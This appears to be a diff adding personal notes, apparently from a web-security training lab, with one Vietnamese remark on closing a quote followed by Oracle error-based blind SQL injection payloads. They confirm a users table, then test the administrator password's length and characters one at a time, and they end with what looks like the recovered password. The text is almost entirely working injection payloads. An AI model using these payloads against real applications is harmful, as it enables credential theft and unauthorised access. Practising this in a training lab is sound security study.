@@ -1,0 +1,13 @@
+có 1 ngoặc chưa đóng nên phải thêm 'ở cuối
+
+'|| (select '' from users where rownum=1) ||'
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator') ||'
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and LENGTH(password)>20) ||'
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and substr(password,1,1) = 'a') ||'
+
+
+
+3arxut8jbzapgt1txo45
